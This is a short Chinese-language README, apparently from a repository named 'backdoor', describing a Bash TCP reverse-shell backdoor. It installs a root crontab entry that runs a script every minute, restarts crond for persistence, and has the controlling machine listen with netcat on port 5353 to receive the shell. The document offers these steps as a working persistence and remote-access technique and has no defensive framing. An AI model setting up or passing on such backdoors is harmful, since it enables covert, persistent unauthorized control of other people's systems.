# backdoor

****************************************************
1 Bash TCP反弹后门<br>
bash_tcp_backdoor.sh<br>
vim /etc/crontab<br>
*/1 * * * * root /root/ok.sh<br>
或<br>
crontab -e<br>
*/1 * * * *  /root/ok.sh<br>
systemctl restart crond<br>
控制机执行<br>
nc -l -v -p 5353
